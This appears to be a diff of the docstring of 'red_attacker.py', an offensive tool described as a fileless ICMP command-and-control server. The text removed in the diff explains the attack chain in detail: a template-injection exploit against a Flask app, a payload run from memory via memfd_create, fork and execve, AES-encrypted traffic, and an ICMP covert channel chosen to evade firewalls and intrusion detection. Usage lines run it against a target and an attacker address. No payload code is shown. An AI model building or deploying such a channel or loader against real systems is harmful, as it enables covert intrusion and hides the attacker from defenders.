@@ -1,101 +1,20 @@
 #!/usr/bin/env python3
 """
 red_attacker.py - Fileless ICMP C2 Server
-================================================================================
-MITRE ATT&CK : T1059.006  T1027  T1095  T1620
-Kill Chain    : Phase 2 Weaponization → Phase 4 Exploitation → Phase 6 C2
+MITRE ATT&CK: T1059.006, T1027, T1095, T1620
 
-PRINCIPLE 1 — Fileless Execution via memfd_create
---------------------------------------------------
-Traditional malware writes an executable to disk (/tmp/backdoor), which:
-  - Leaves a file artifact for forensic analysis
-  - Triggers inotify / fanotify filesystem watchers
-  - Is scanned by on-access AV/EDR agents
+SSTI exploit -> memfd_create payload -> AES-256-CTR encrypted ICMP C2.
+Generates a curl/SSTI command for injection into the target Flask app,
+then provides an interactive C2 shell over ICMP echo requests.
 
-memfd_create(2) (Linux ≥ 3.17, syscall 319 on x86_64) creates an *anonymous
-file* that lives entirely in the kernel's tmpfs layer.  Key properties:
-  - Returns a file descriptor (fd) that behaves like a regular file
-  - The fd is NOT linked to any directory entry — no path on any filesystem
-  - The kernel assigns an inode in the "anon_inode" pseudo-filesystem
-  - The content lives in page cache (RAM), never written to block device
-  - /proc/<pid>/fd/<N> provides a synthetic path to the fd, allowing execve()
-
-Attack chain:
-  1. fd = syscall(319, "", 0)        # memfd_create — anonymous fd in RAM
-  2. write(fd, agent_code)           # write payload to fd (still in RAM)
-  3. fork()                          # parent returns to keep Flask alive
-  4. execve("/usr/bin/python3",      # child executes python3 with the memfd
-           ["/proc/<pid>/fd/<N>"])   # kernel resolves path → reads memfd → RCE
-
-Why /proc/<pid>/fd/N works with execve:
-  - procfs is a virtual filesystem; each entry under /proc/<pid>/fd/ is a
-    symlink to the real kernel file object (struct file)
-  - execve() resolves the symlink, reaches the anonymous inode, and reads
-    the memfd content to load the executable/script
-  - After execve(), the fd may be closed (CLOEXEC), but the kernel already
-    loaded the content — the process runs from memory
-
-Why fork() is needed:
-  - The SSTI popen() subprocess must exit promptly so Flask can return
-    the HTTP response.  fork() creates a child that runs independently.
-  - When the parent exits, the child becomes an orphan, re-parented to PID 1.
-  - The child's memfd fd is a duplicate (fork copies the fd table), so the
-    memfd remains valid even after the parent closes it.
-
-PRINCIPLE 2 — AES-256-CTR Encryption via OpenSSL
---------------------------------------------------
-AES-256-CTR (Counter mode) is a NIST-standardized symmetric cipher.
-Implementation uses ctypes to call system OpenSSL libcrypto directly,
-avoiding any pip dependencies while achieving industry-standard strength.
-
-Properties:
-  + Semantic security: random IV per packet prevents pattern analysis
-  + No padding: ciphertext length = plaintext length (ideal for ICMP)
-  + Industry standard: AES-256 with 2^256 key space
-  + Zero pip dependencies: uses system libcrypto via ctypes
-  - Requires OpenSSL on target (pre-installed on all Linux distros)
-
-Key derivation: AES_KEY = SHA-256(SHARED_SECRET) → 32 bytes
-Per-packet: IV = os.urandom(16), prepended to ciphertext
-
-PRINCIPLE 3 — ICMP Covert Channel
------------------------------------
-ICMP (Internet Control Message Protocol, RFC 792) is a Layer 3 protocol used
-for network diagnostics (ping, traceroute, unreachable notifications).
-
-Why ICMP makes a good covert channel:
-  1. Firewalls often ALLOW ICMP by default (blocking it breaks ping/traceroute)
-  2. ICMP echo request (type 8) and reply (type 0) carry an arbitrary-length
-     data payload field — the protocol places no constraints on its content
-  3. Most IDS/IPS inspect TCP/UDP ports and payloads, but treat ICMP payload
-     as opaque diagnostic data
-  4. ICMP has no port numbers → no connection state → harder to track
-
-Raw socket behavior on Linux:
-  - socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) requires root or CAP_NET_RAW
-  - The kernel delivers a COPY of each incoming ICMP packet to raw sockets
-  - The kernel ALSO processes echo requests internally (auto-reply)
-  - We filter by ICMP ID field (0x1337) and type (8 = echo request) to
-    distinguish our C2 traffic from normal pings
-
-Our protocol over ICMP:
-  ┌──────────────────────────────────────────────────────┐
-  │ IP Header (20B) │ ICMP Header (8B) │ Our Payload    │
-  │                 │ type=8 code=0    │ ┌────────��────┐│
-  │                 │ checksum         │ │ MAGIC (1B)  ││
-  │                 │ ID=0x1337        │ │ MSG_TYPE(1B)││
-  │                 │ SEQ              │ │ IV+AES data ││
-  │                 │                  │ └─────────────┘│
-  └──────────────────────────────────────────────────────┘
-
-Both C2 server and agent send ICMP type 8 (echo request).
-Both ignore type 0 (echo reply) — these are kernel auto-replies to the
-other side's type 8 packets, and don't carry our protocol data.
+Key components:
+  - Embedded agent code (runs in-memory on target via memfd_create)
+  - AES-256-CTR encryption using system OpenSSL via ctypes
+  - ICMP covert channel with custom protocol (MAGIC + MSG_TYPE + IV + ciphertext)
 
 Usage:
   sudo python3 red_attacker.py -t TARGET_IP -l ATTACKER_IP
   sudo python3 red_attacker.py -t TARGET_IP -l ATTACKER_IP --payload-only
-================================================================================
 """
 import socket
 import struct
